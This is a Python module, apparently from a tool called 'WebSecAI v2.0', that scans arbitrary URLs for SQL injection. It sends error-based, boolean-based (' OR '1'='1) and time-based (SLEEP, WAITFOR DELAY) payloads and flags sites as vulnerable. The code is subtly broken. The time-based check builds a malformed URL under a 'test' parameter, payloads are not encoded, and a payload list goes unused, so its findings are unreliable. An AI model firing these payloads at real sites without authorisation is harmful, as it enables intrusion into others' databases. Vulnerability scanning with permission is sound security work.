import requests
import re
import time
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode

SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation",
    "mysql_fetch_array", "sqlstate[hy000]", "ORA-01756", "PostgreSQL query failed"
]

BOOLEAN_PAYLOADS = [
    "' OR '1'='1", "' OR '1'='2", "1' AND SLEEP(5)--", "1' OR SLEEP(5)--"
]

TIME_BASED = ["1' AND (SELECT SLEEP(5))--", "1'; WAITFOR DELAY '0:0:5'--"]

def extract_params(url: str) -> List[str]:
    """Находит параметры для fuzzing (?id=1&cat=2)"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return list(params.keys()) if params else ['id', 'cat', 'search', 'q']

def _has_sql_error(text: str) -> bool:
    return any(sig in text.lower() for sig in SQL_ERROR_SIGNATURES)

def _time_blind(url: str, payload: str, threshold: float = 4.0) -> bool:
    """Time-based blind SQLi"""
    test_url = f"{url}?test={payload}"
    t0 = time.time()
    try:
        resp = requests.get(test_url, timeout=8)
        delay = time.time() - t0
        return delay > threshold
    except:
        return False

def scan_sql_injection(url: str) -> bool:
    """
    🆕 Полный SQLi сканер для WebSecAI v2.0:
    1. Param discovery
    2. Error-based 
    3. Boolean-based
    4. Time-based
    """
    print(f"🔍 SQLi scan: {url}")
    
    # 1. Найти параметры
    params = extract_params(url)
    if not params:
        print("  ℹ️ No params found, testing defaults...")
        params = ['id', 'q']
    
    vulnerable = False
    
    for param in params[:3]:  # Top 3 params
        print(f"  Testing param: {param}")
        
        # 2. Error-based
        test_url = f"{url}?{param}='"
        try:
            resp = requests.get(test_url, timeout=5)
            if _has_sql_error(resp.text):
                print(f"  🟡 ERROR-BASED SQLi → {param}='{param}")
                vulnerable = True
                continue
        except:
            pass
        
        # 3. Boolean-based (content length diff)
        normal = f"{url}?{param}=1"
        blind = f"{url}?{param}=' OR '1'='1"
        
        try:
            r1 = requests.get(normal, timeout=5)
            r2 = requests.get(blind, timeout=5)
            
            if len(r2.text) != len(r1.text):  # Content change
                print(f"  🟡 BOOLEAN SQLi → len diff {len(r1.text)} ≠ {len(r2.text)}")
                vulnerable = True
        except:
            pass
        
        # 4. Time-based
        for payload in TIME_BASED:
            if _time_blind(url, f"{param}={payload}"):
                print(f"  🟠 TIME-BASED SQLi → {payload}")
                vulnerable = True
                break
    
    print(f"  ✅ SQLi: {'VULNERABLE' if vulnerable else 'CLEAN'}")
    return vulnerable
